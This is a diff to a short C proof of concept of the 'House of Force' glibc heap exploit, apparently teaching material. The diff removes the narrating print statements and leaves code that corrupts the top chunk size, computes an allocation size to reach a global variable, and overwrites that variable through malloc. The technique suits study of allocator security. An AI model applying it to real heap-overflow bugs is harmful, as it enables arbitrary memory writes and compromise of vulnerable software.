@@ -39,43 +39,23 @@ char bss_var[] = "This is a string that we want to overwrite.";
 
 int main(int argc , char* argv[])
 {
-	fprintf(stderr, "\nWelcome to the House of Force\n\n");
-	fprintf(stderr, "The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n");
-
-	fprintf(stderr, "\nIn the end, we will use this to overwrite a variable at %p.\n", bss_var);
-	fprintf(stderr, "Its current value is: %s\n", bss_var);
-
-	fprintf(stderr, "\nLet's allocate the first chunk, taking space from the wilderness.\n");
 	intptr_t *p1 = malloc(256);
 	int real_size = malloc_usable_size(p1);
 
-	//----- VULNERABILITY ----
-	// Assuming a heap overflow allows us to reach the Top Chunk's header
+	// VULNERABILITY: Corrupt Top Chunk size
 	intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));
-	fprintf(stderr, "\nThe top chunk starts at %p\n", ptr_top);
-
-	fprintf(stderr, "\nOverwriting the top chunk size with -1 (maximum possible value).\n");
 	*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
-	//------------------------
 
-	/*
-	 * Calculate the 'evil_size' needed to reach bss_var.
-	 * Request size = target_addr - top_chunk_addr - metadata_overhead
-	 */
+	// Calculate size to reach target
 	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
 
-	fprintf(stderr, "\nMalloc-ing %#lx bytes to reach the target region.\n", evil_size);
-	void *new_ptr = malloc(evil_size);
+	malloc(evil_size);
 
-	// The next allocation will now be served from our target address
 	void* ctr_chunk = malloc(100);
-	fprintf(stderr, "\nmalloc(100) => %p!\n", ctr_chunk);
-
-	fprintf(stderr, "... old string: %s\n", bss_var);
 	strcpy(ctr_chunk, "YEAH!!!");
-	fprintf(stderr, "... new string: %s\n", bss_var);
 
 	assert(ctr_chunk == bss_var);
+	return 0;
 }
 ```
 
